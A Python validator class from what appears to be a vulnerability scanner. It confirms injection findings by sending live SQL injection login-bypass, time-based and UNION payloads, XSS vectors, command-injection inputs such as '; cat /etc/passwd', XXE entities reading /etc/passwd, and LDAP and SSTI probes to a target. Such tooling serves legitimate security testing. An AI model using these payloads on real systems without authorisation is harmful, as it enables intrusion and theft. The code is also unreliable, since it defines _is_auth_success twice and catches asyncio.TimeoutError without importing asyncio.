# =============================================================================
# A05: INJECTION VALIDATOR (was A03 in 2021!)
# =============================================================================

import re
import time
import json
import urllib.parse
from typing import Optional, Dict, Tuple

from .base import (
    BaseValidator,
    ValidationResult,
    ValidationReport,
    VulnReport,
)

class A05_InjectionValidator(BaseValidator):
    """
    OWASP 2025 A05: Injection
    
    Validates:
    - SQL Injection (error-based, boolean-based, time-based, union-based)
    - XSS (reflected, stored)
    - Command Injection
    - LDAP Injection
    - XML Injection / XXE
    - SSTI (Server-Side Template Injection)
    """
    
    async def validate(self, vuln: VulnReport) -> ValidationReport:
        vuln_subtype = vuln.vuln_type.upper()
        
        if "SQL" in vuln_subtype:
            return await self._validate_sqli(vuln)
        elif "XSS" in vuln_subtype or "CROSS" in vuln_subtype:
            return await self._validate_xss(vuln)
        elif "COMMAND" in vuln_subtype or "RCE" in vuln_subtype or "OS" in vuln_subtype:
            return await self._validate_command_injection(vuln)
        elif "LDAP" in vuln_subtype:
            return await self._validate_ldap_injection(vuln)
        elif "XML" in vuln_subtype or "XXE" in vuln_subtype:
            return await self._validate_xxe(vuln)
        elif "SSTI" in vuln_subtype or "TEMPLATE" in vuln_subtype:
            return await self._validate_ssti(vuln)
        else:
            # Try all injection types
            return await self._validate_generic_injection(vuln)
    
    async def _validate_sqli(self, vuln: VulnReport) -> ValidationReport:
        """SQL Injection validation using multiple techniques"""
        results = []

        # 0. Auth bypass — proof = successful login, not SQL errors.
        bypass_result = await self._sqli_auth_bypass(vuln)
        if bypass_result.result == ValidationResult.CONFIRMED:
            return bypass_result
        # Only append if it's not REJECTED due to "not a login endpoint"
        # (that's expected for non-auth SQLi)
        if "Not a login endpoint" not in bypass_result.evidence:
            results.append(bypass_result)

        # 1. Error-based SQLi
        error_result = await self._sqli_error_based(vuln)
        if error_result.result == ValidationResult.CONFIRMED:
            return error_result
        results.append(error_result)
        
        # 2. Boolean-based SQLi
        boolean_result = await self._sqli_boolean_based(vuln)
        if boolean_result.result == ValidationResult.CONFIRMED:
            return boolean_result
        results.append(boolean_result)
        
        # 3. Time-based SQLi
        time_result = await self._sqli_time_based(vuln)
        if time_result.result == ValidationResult.CONFIRMED:
            return time_result
        results.append(time_result)
        
        # 4. Union-based SQLi
        union_result = await self._sqli_union_based(vuln)
        if union_result.result == ValidationResult.CONFIRMED:
            return union_result
        results.append(union_result)
        
        # Return best result
        best = max(results, key=lambda r: r.confidence)
        return best
    
    async def _sqli_auth_bypass(self, vuln: VulnReport) -> ValidationReport:
        """
        SQLi auth bypass - proof = successful login (HTTP 200 + token), not SQL errors.
        This is DIFFERENT from regular SQLi - we're checking authentication bypass.
        """
        try:
            endpoint_lower = vuln.endpoint.lower()
            title_lower = vuln.vuln_type.lower()
            payload_lower = (vuln.payload or "").lower()
            
            # ─── Check 1: Is this a login endpoint or auth bypass attempt? ───
            is_login_endpoint = any(x in endpoint_lower for x in 
                ["login", "auth", "signin", "sign-in", "session", "user/login", "api/login"])
            
            is_bypass_title = any(x in title_lower for x in 
                ["auth", "bypass", "login", "credential", "authentication"])
            
            is_bypass_payload = any(x in payload_lower for x in 
                ["' or 1=1", "' or '1'='1", "or 1=1--", "admin'--", 
                 "' and 1=1", "or 1=1#", "' or 1=1;", "' or 1=1 --"])
            
            # Fire if ANY condition matches
            if not (is_login_endpoint or is_bypass_title or is_bypass_payload):
                return ValidationReport(
                    result=ValidationResult.REJECTED,
                    confidence=0.0,
                    evidence="Not a login endpoint — skipping bypass check",
                    validation_method="SQLi Auth Bypass"
                )
            
            # ─── Determine target endpoint ───
            login_endpoint = vuln.endpoint
            if not login_endpoint.startswith("http"):
                login_endpoint = f"{self.target_url}/{login_endpoint.lstrip('/')}"
            
            # ─── Build auth bypass payloads ───
            # Try agent's payload first if it looks like bypass
            auth_payloads = []
            if vuln.payload and is_bypass_payload:
                auth_payloads.append(vuln.payload)
            
            # Then standard bypass payloads
            auth_payloads.extend([
                "' OR 1=1--",
                "' or 1=1--",
                "admin'--",
                "' OR '1'='1",
                "' or '1'='1",
                "admin' OR 1=1--",
                "admin' or 1=1--",
                "' OR 1=1#",
                "' or 1=1#",
            ])
            
            # ─── Try each payload ───
            for payload in auth_payloads:
                # Try JSON format (most modern APIs)
                json_body = {
                    "email": payload,
                    "password": "anything"
                }
                
                status, body, headers = await self._request(
                    "POST", 
                    login_endpoint,
                    headers={**vuln.headers, "Content-Type": "application/json"},
                    data=json.dumps(json_body)
                )
                
                # Check if auth succeeded
                if self._is_auth_success(status, body, headers):
                    return ValidationReport(
                        result=ValidationResult.CONFIRMED,
                        confidence=1.0,
                        evidence=f"Auth bypass confirmed: email={payload} → HTTP {status} + session token",
                        validation_method="SQLi Auth Bypass",
                        details={"payload": payload, "endpoint": login_endpoint}
                    )
                
                # Try form-encoded as fallback
                form_data = f"email={urllib.parse.quote(payload)}&password=anything"
                status2, body2, headers2 = await self._request(
                    "POST",
                    login_endpoint, 
                    headers={**vuln.headers, "Content-Type": "application/x-www-form-urlencoded"},
                    data=form_data
                )
                
                if self._is_auth_success(status2, body2, headers2):
                    return ValidationReport(
                        result=ValidationResult.CONFIRMED,
                        confidence=1.0,
                        evidence=f"Auth bypass confirmed: email={payload} → HTTP {status2} + session token",
                        validation_method="SQLi Auth Bypass",
                        details={"payload": payload, "endpoint": login_endpoint}
                    )
            
            return ValidationReport(
                result=ValidationResult.REJECTED,
                confidence=0.0,
                evidence="No successful auth bypass",
                validation_method="SQLi Auth Bypass"
            )
            
        except Exception as e:
            return ValidationReport(
                result=ValidationResult.INCONCLUSIVE,
                confidence=0.0,
                evidence=f"Error: {str(e)}",
                validation_method="SQLi Auth Bypass"
            )
    
    def _is_auth_success(self, status: int, body: str, headers: dict) -> bool:
        """
        Check if response indicates successful authentication.
        Returns True if login succeeded.
        """
        # Status check
        if status not in [200, 201]:
            return False
        
        # Check for failure indicators
        failure_words = [
            "invalid", "incorrect", "wrong", "failed", "unauthorized",
            "denied", "error", "bad credentials", "authentication failed"
        ]
        body_lower = body.lower()
        if any(word in body_lower for word in failure_words):
            return False
        
        # Check for success indicators
        # Token in body
        if any(x in body_lower for x in ["token", "jwt", "bearer", "session"]):
            # But make sure it's actual auth token, not just the word
            if re.search(r'"(?:token|authentication|auth)"\s*:\s*"[A-Za-z0-9_\-\.]{20,}"', body, re.I):
                return True
        
        # Session cookie set
        set_cookie = headers.get("Set-Cookie", "")
        if any(x in set_cookie.lower() for x in ["session", "token", "auth"]):
            return True
        
        # Redirect to dashboard/home/profile
        location = headers.get("Location", "")
        if any(x in location.lower() for x in ["dashboard", "home", "profile", "account"]):
            return True
        
        # Response contains user data
        if re.search(r'"(?:email|username|user)"', body, re.I):
            return True
        
        return False


    def _is_auth_success(self, status: int, body: str, headers: dict) -> bool:
        """Check if response indicates successful auth. Generic heuristics."""
        if status not in (200, 201):
            return False
        body_lower = body.lower()
        # Explicit failures override everything
        failures = ["invalid", "incorrect", "unauthorized", "forbidden",
                    "bad credentials", "login failed", "authentication failed",
                    "wrong password", "user not found"]
        if any(f in body_lower for f in failures):
            return False
        # Token/JWT in body
        if any(t in body_lower for t in ["token", "jwt", "bearer", "access_token", "eyJ"]):
            return True
        # Session cookie set
        cookie = headers.get("Set-Cookie", headers.get("set-cookie", "")).lower()
        if any(c in cookie for c in ["session", "auth", "token", "sid"]):
            return True
        # Post-login redirect
        loc = headers.get("Location", headers.get("location", "")).lower()
        if any(x in loc for x in ["dashboard", "profile", "home", "welcome"]):
            return True
        return False

    async def _sqli_error_based(self, vuln: VulnReport) -> ValidationReport:
        """Error-based SQLi: Look for SQL errors in response"""
        try:
            error_payloads = ["'", '"', "' OR '", "1' AND '1'='1", "1; --"]
            
            sql_errors = [
                r"sql syntax.*mysql", r"warning.*mysql", r"mysql_fetch",
                r"ORA-\d{5}", r"Oracle.*error",
                r"PostgreSQL.*ERROR", r"pg_query",
                r"SQLite.*error", r"sqlite3_",
                r"Microsoft.*ODBC", r"mssql_query",
                r"SQL Server.*error",
                r"unclosed quotation mark",
                r"quoted string not properly terminated",
                r"syntax error.*SQL",
            ]
            
            for payload in error_payloads:
                url, data = self._build_request_with_payload(vuln, payload)
                status, body, _ = await self._request(vuln.method, url, headers=vuln.headers, data=data)
                
                for error_pattern in sql_errors:
                    if re.search(error_pattern, body, re.I):
                        return ValidationReport(
                            result=ValidationResult.CONFIRMED,
                            confidence=1.0,
                            evidence=f"SQL error triggered: {error_pattern}",
                            validation_method="SQLi - Error Based",
                            details={"payload": payload, "error": error_pattern}
                        )
            
            return ValidationReport(
                result=ValidationResult.REJECTED,
                confidence=0.0,
                evidence="No SQL errors triggered",
                validation_method="SQLi - Error Based"
            )
            
        except Exception as e:
            return ValidationReport(
                result=ValidationResult.INCONCLUSIVE,
                confidence=0.0,
                evidence=f"Error: {str(e)}",
                validation_method="SQLi - Error Based"
            )
    
    async def _sqli_boolean_based(self, vuln: VulnReport) -> ValidationReport:
        """Boolean-based SQLi: Compare true vs false responses"""
        try:
            # True condition should return normal response
            true_payloads = ["' OR '1'='1", "' OR 1=1--", "1 OR 1=1", "') OR ('1'='1"]
            # False condition should return different/empty response  
            false_payloads = ["' AND '1'='2", "' OR 1=2--", "1 AND 1=2", "') AND ('1'='2"]
            
            for true_payload, false_payload in zip(true_payloads, false_payloads):
                # True condition
                url_true, data_true = self._build_request_with_payload(vuln, true_payload)
                _, body_true, _ = await self._request(vuln.method, url_true, headers=vuln.headers, data=data_true)
                
                # False condition
                url_false, data_false = self._build_request_with_payload(vuln, false_payload)
                _, body_false, _ = await self._request(vuln.method, url_false, headers=vuln.headers, data=data_false)
                
                # Significant length difference indicates boolean SQLi
                len_diff = abs(len(body_true) - len(body_false))
                if len_diff > 100 or (len(body_false) < len(body_true) * 0.5):
                    return ValidationReport(
                        result=ValidationResult.CONFIRMED,
                        confidence=0.95,
                        evidence=f"Boolean-based SQLi confirmed. True response: {len(body_true)} bytes, False: {len(body_false)} bytes",
                        validation_method="SQLi - Boolean Based",
                        details={
                            "true_payload": true_payload,
                            "false_payload": false_payload,
                            "length_diff": len_diff
                        }
                    )
            
            return ValidationReport(
                result=ValidationResult.REJECTED,
                confidence=0.0,
                evidence="No boolean-based SQLi detected",
                validation_method="SQLi - Boolean Based"
            )
            
        except Exception as e:
            return ValidationReport(
                result=ValidationResult.INCONCLUSIVE,
                confidence=0.0,
                evidence=f"Error: {str(e)}",
                validation_method="SQLi - Boolean Based"
            )
    
    async def _sqli_time_based(self, vuln: VulnReport) -> ValidationReport:
        """Time-based blind SQLi: Measure response delay"""
        try:
            delay_seconds = 5
            
            time_payloads = [
                f"' OR SLEEP({delay_seconds})--",
                f"'; WAITFOR DELAY '0:0:{delay_seconds}'--",
                f"' OR pg_sleep({delay_seconds})--",
                f"1' AND SLEEP({delay_seconds}) AND '1'='1",
                f"1; SELECT SLEEP({delay_seconds})",
            ]
            
            # Baseline timing
            url_base, data_base = self._build_request_with_payload(vuln, "1")
            baseline_time, _, _ = await self._timed_request(vuln.method, url_base, headers=vuln.headers, data=data_base)
            
            for payload in time_payloads:
                url, data = self._build_request_with_payload(vuln, payload)
                elapsed, _, _ = await self._timed_request(vuln.method, url, headers=vuln.headers, data=data)
                
                # If response took significantly longer (at least delay_seconds - 1)
                if elapsed >= (delay_seconds - 1) and elapsed > baseline_time + (delay_seconds - 1):
                    return ValidationReport(
                        result=ValidationResult.CONFIRMED,
                        confidence=0.95,
                        evidence=f"Time-based SQLi confirmed. Response delayed by {elapsed:.1f}s (baseline: {baseline_time:.1f}s)",
                        validation_method="SQLi - Time Based",
                        details={
                            "payload": payload,
                            "elapsed": elapsed,
                            "baseline": baseline_time,
                            "expected_delay": delay_seconds
                        }
                    )
            
            return ValidationReport(
                result=ValidationResult.REJECTED,
                confidence=0.0,
                evidence="No time-based SQLi detected",
                validation_method="SQLi - Time Based"
            )
            
        except asyncio.TimeoutError:
            # Timeout could actually indicate successful time-based injection
            return ValidationReport(
                result=ValidationResult.HIGH,
                confidence=0.8,
                evidence="Request timed out - possible time-based SQLi",
                validation_method="SQLi - Time Based"
            )
        except Exception as e:
            return ValidationReport(
                result=ValidationResult.INCONCLUSIVE,
                confidence=0.0,
                evidence=f"Error: {str(e)}",
                validation_method="SQLi - Time Based"
            )
    
    async def _sqli_union_based(self, vuln: VulnReport) -> ValidationReport:
        """Union-based SQLi: Extract data via UNION SELECT"""
        try:
            # First determine column count
            for num_cols in range(1, 15):
                nulls = ",".join(["NULL"] * num_cols)
                payload = f"' UNION SELECT {nulls}--"
                url, data = self._build_request_with_payload(vuln, payload)
                status, body, _ = await self._request(vuln.method, url, headers=vuln.headers, data=data)
                
                # If no error, we found the column count
                if status == 200 and "error" not in body.lower():
                    # Try to extract version string
                    version_payloads = [
                        f"' UNION SELECT {','.join(['NULL']*(num_cols-1) + ['@@version'])}--",
                        f"' UNION SELECT {','.join(['NULL']*(num_cols-1) + ['version()'])}--",
                        f"' UNION SELECT {','.join(['NULL']*(num_cols-1) + ['sqlite_version()'])}--",
                    ]
                    
                    for v_payload in version_payloads:
                        v_url, v_data = self._build_request_with_payload(vuln, v_payload)
                        _, v_body, _ = await self._request(vuln.method, v_url, headers=vuln.headers, data=v_data)
                        
                        # Check for version patterns
                        version_patterns = [
                            r"\d+\.\d+\.\d+",  # Generic version
                            r"MySQL", r"MariaDB", r"PostgreSQL", r"SQLite", r"Microsoft SQL Server"
                        ]
                        
                        for pattern in version_patterns:
                            if re.search(pattern, v_body):
                                return ValidationReport(
                                    result=ValidationResult.CONFIRMED,
                                    confidence=1.0,
                                    evidence=f"Union-based SQLi confirmed. Extracted database info.",
                                    validation_method="SQLi - Union Based",
                                    details={"columns": num_cols, "payload": v_payload}
                                )
            
            return ValidationReport(
                result=ValidationResult.REJECTED,
                confidence=0.0,
                evidence="No union-based SQLi detected",
                validation_method="SQLi - Union Based"
            )
            
        except Exception as e:
            return ValidationReport(
                result=ValidationResult.INCONCLUSIVE,
                confidence=0.0,
                evidence=f"Error: {str(e)}",
                validation_method="SQLi - Union Based"
            )
    
    async def _validate_xss(self, vuln: VulnReport) -> ValidationReport:
        """XSS validation: Check if payload is reflected unescaped"""
        try:
            # Unique marker to identify our payload
            marker = f"xss{int(time.time())}"
            
            xss_payloads = [
                f"<script>{marker}</script>",
                f"<img src=x onerror={marker}>",
                f"<svg onload={marker}>",
                f"'\" onfocus={marker} autofocus=\"",
                f"javascript:{marker}",
                f"<body onload={marker}>",
            ]
            
            for payload in xss_payloads:
                url, data = self._build_request_with_payload(vuln, payload)
                status, body, _ = await self._request(vuln.method, url, headers=vuln.headers, data=data)
                
                # Check if payload appears unescaped
                if payload in body:
                    return ValidationReport(
                        result=ValidationResult.CONFIRMED,
                        confidence=1.0,
                        evidence=f"XSS payload reflected without encoding: {payload[:50]}",
                        validation_method="XSS - Reflection Check",
                        details={"payload": payload}
                    )
                
                # Check if marker appears in dangerous context
                if marker in body:
                    # Verify it's in executable context
                    dangerous_contexts = [
                        rf"<script[^>]*>[^<]*{marker}",
                        rf"on\w+\s*=\s*['\"]?[^'\"]*{marker}",
                        rf"javascript:[^'\"]*{marker}",
                    ]
                    
                    for ctx in dangerous_contexts:
                        if re.search(ctx, body, re.I):
                            return ValidationReport(
                                result=ValidationResult.CONFIRMED,
                                confidence=1.0,
                                evidence=f"XSS payload in executable context",
                                validation_method="XSS - Context Analysis",
                                details={"context": ctx}
                            )
            
            # Check original payload from report
            url, data = self._build_request_with_payload(vuln, vuln.payload)
            _, body, _ = await self._request(vuln.method, url, headers=vuln.headers, data=data)
            
            if vuln.payload in body and ("<" in vuln.payload or "on" in vuln.payload.lower()):
                return ValidationReport(
                    result=ValidationResult.HIGH,
                    confidence=0.85,
                    evidence="Original XSS payload reflected in response",
                    validation_method="XSS - Original Payload",
                    details={"payload": vuln.payload[:50]}
                )
            
            return ValidationReport(
                result=ValidationResult.REJECTED,
                confidence=0.0,
                evidence="XSS payload not reflected or properly encoded",
                validation_method="XSS"
            )
            
        except Exception as e:
            return ValidationReport(
                result=ValidationResult.INCONCLUSIVE,
                confidence=0.0,
                evidence=f"Error: {str(e)}",
                validation_method="XSS"
            )
    
    async def _validate_command_injection(self, vuln: VulnReport) -> ValidationReport:
        """Command Injection validation"""
        try:
            delay_seconds = 5
            
            # Time-based payloads
            time_payloads = [
                f"; sleep {delay_seconds}",
                f"| sleep {delay_seconds}",
                f"& sleep {delay_seconds}",
                f"`sleep {delay_seconds}`",
                f"$(sleep {delay_seconds})",
                f"; ping -c {delay_seconds} 127.0.0.1",
            ]
            
            # Baseline timing
            url_base, data_base = self._build_request_with_payload(vuln, "test")
            baseline_time, _, _ = await self._timed_request(vuln.method, url_base, headers=vuln.headers, data=data_base)
            
            for payload in time_payloads:
                url, data = self._build_request_with_payload(vuln, payload)
                try:
                    elapsed, _, _ = await self._timed_request(vuln.method, url, headers=vuln.headers, data=data)
                    
                    if elapsed >= (delay_seconds - 1) and elapsed > baseline_time + (delay_seconds - 1):
                        return ValidationReport(
                            result=ValidationResult.CONFIRMED,
                            confidence=0.95,
                            evidence=f"Command injection confirmed via time delay: {elapsed:.1f}s",
                            validation_method="Command Injection - Time Based",
                            details={"payload": payload, "elapsed": elapsed}
                        )
                except asyncio.TimeoutError:
                    return ValidationReport(
                        result=ValidationResult.HIGH,
                        confidence=0.85,
                        evidence="Request timed out - possible command injection",
                        validation_method="Command Injection - Time Based"
                    )
            
            # Output-based payloads
            output_payloads = [
                ("; whoami", r"\b(root|www-data|apache|nginx|admin|user)\b"),
                ("| id", r"uid=\d+.*gid=\d+"),
                ("; cat /etc/passwd", r"root:.*:0:0"),
                ("& echo CMDINJTEST", r"CMDINJTEST"),
            ]
            
            for payload, expected in output_payloads:
                url, data = self._build_request_with_payload(vuln, payload)
                _, body, _ = await self._request(vuln.method, url, headers=vuln.headers, data=data)
                
                if re.search(expected, body):
                    return ValidationReport(
                        result=ValidationResult.CONFIRMED,
                        confidence=1.0,
                        evidence=f"Command injection confirmed: output matched pattern",
                        validation_method="Command Injection - Output Based",
                        details={"payload": payload, "pattern": expected}
                    )
            
            return ValidationReport(
                result=ValidationResult.REJECTED,
                confidence=0.0,
                evidence="Could not confirm command injection",
                validation_method="Command Injection"
            )
            
        except Exception as e:
            return ValidationReport(
                result=ValidationResult.INCONCLUSIVE,
                confidence=0.0,
                evidence=f"Error: {str(e)}",
                validation_method="Command Injection"
            )
    
    async def _validate_ldap_injection(self, vuln: VulnReport) -> ValidationReport:
        """LDAP Injection validation"""
        try:
            ldap_payloads = [
                "*",
                "*)(&",
                "*)(uid=*))(|(uid=*",
                "admin)(&)",
                "x])(|(cn=*",
            ]
            
            for payload in ldap_payloads:
                url, data = self._build_request_with_payload(vuln, payload)
                status, body, _ = await self._request(vuln.method, url, headers=vuln.headers, data=data)
                
                # Look for LDAP errors or unexpected data
                ldap_indicators = [
                    r"LDAP", r"ldap_", r"Invalid DN syntax",
                    r"Bad search filter", r"cn=", r"dc=", r"ou="
                ]
                
                for indicator in ldap_indicators:
                    if re.search(indicator, body, re.I):
                        return ValidationReport(
                            result=ValidationResult.HIGH,
                            confidence=0.85,
                            evidence=f"LDAP injection indicator found: {indicator}",
                            validation_method="LDAP Injection",
                            details={"payload": payload, "indicator": indicator}
                        )
            
            return ValidationReport(
                result=ValidationResult.REJECTED,
                confidence=0.0,
                evidence="Could not confirm LDAP injection",
                validation_method="LDAP Injection"
            )
            
        except Exception as e:
            return ValidationReport(
                result=ValidationResult.INCONCLUSIVE,
                confidence=0.0,
                evidence=f"Error: {str(e)}",
                validation_method="LDAP Injection"
            )
    
    async def _validate_xxe(self, vuln: VulnReport) -> ValidationReport:
        """XXE (XML External Entity) Injection validation"""
        try:
            xxe_payloads = [
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "/etc/passwd">]><root>&xxe;</root>',
            ]
            
            for payload in xxe_payloads:
                headers = vuln.headers.copy()
                headers["Content-Type"] = "application/xml"
                
                status, body, _ = await self._request(
                    "POST", vuln.endpoint, headers=headers, data=payload
                )
                
                if re.search(r"root:.*:0:0", body):
                    return ValidationReport(
                        result=ValidationResult.CONFIRMED,
                        confidence=1.0,
                        evidence="XXE confirmed: /etc/passwd content extracted",
                        validation_method="XXE - File Read",
                        details={"payload": payload[:100]}
                    )
            
            return ValidationReport(
                result=ValidationResult.REJECTED,
                confidence=0.0,
                evidence="Could not confirm XXE",
                validation_method="XXE"
            )
            
        except Exception as e:
            return ValidationReport(
                result=ValidationResult.INCONCLUSIVE,
                confidence=0.0,
                evidence=f"Error: {str(e)}",
                validation_method="XXE"
            )
    
    async def _validate_ssti(self, vuln: VulnReport) -> ValidationReport:
        """
        Server-Side Template Injection validation.

        FIXED: fetches a baseline response (same endpoint, neutral param
        value) BEFORE testing payloads.  Only confirms if the expected
        value ("49") appears in the attack response but NOT in the
        baseline.  Without this, any page that happens to contain "49"
        (prices, IDs, dates) is an instant false positive.
        """
        try:
            # ── baseline: same endpoint, same param, neutral value ──
            baseline_url, baseline_data = self._build_request_with_payload(vuln, "1")
            _, baseline_body, _ = await self._request(
                vuln.method, baseline_url,
                headers=vuln.headers, data=baseline_data
            )
            baseline_body = baseline_body or ""

            ssti_payloads = [
                ("{{7*7}}",    "49"),
                ("${7*7}",     "49"),
                ("<%= 7*7 %>", "49"),
                ("#{7*7}",     "49"),
                ("*{7*7}",     "49"),
                ("{{config}}", "SECRET"),
            ]

            for payload, expected in ssti_payloads:
                # skip if the expected value is already in the baseline —
                # it's ambient content, not template evaluation
                if expected in baseline_body:
                    continue

                url, data = self._build_request_with_payload(vuln, payload)
                _, body, _ = await self._request(vuln.method, url, headers=vuln.headers, data=data)

                if body and expected in body and payload not in body:
                    return ValidationReport(
                        result=ValidationResult.CONFIRMED,
                        confidence=1.0,
                        evidence=f"SSTI confirmed: {payload} evaluated to {expected} (not in baseline)",
                        validation_method="SSTI",
                        details={"payload": payload, "expected": expected}
                    )

            return ValidationReport(
                result=ValidationResult.REJECTED,
                confidence=0.0,
                evidence="Could not confirm SSTI (expected values present in baseline or payloads not evaluated)",
                validation_method="SSTI"
            )

        except Exception as e:
            return ValidationReport(
                result=ValidationResult.INCONCLUSIVE,
                confidence=0.0,
                evidence=f"Error: {str(e)}",
                validation_method="SSTI"
            )
    
    async def _validate_generic_injection(self, vuln: VulnReport) -> ValidationReport:
        """Try all injection types when subtype unknown"""
        validators = [
            self._sqli_error_based,
            self._sqli_boolean_based,
            self._validate_xss,
            self._validate_command_injection,
        ]
        
        for validator in validators:
            result = await validator(vuln)
            if result.result in (ValidationResult.CONFIRMED, ValidationResult.HIGH):
                return result
        
        return ValidationReport(
            result=ValidationResult.REJECTED,
            confidence=0.0,
            evidence="No injection vulnerability confirmed",
            validation_method="Generic Injection"
        )
    
        # _build_request_with_payload is inherited from BaseValidator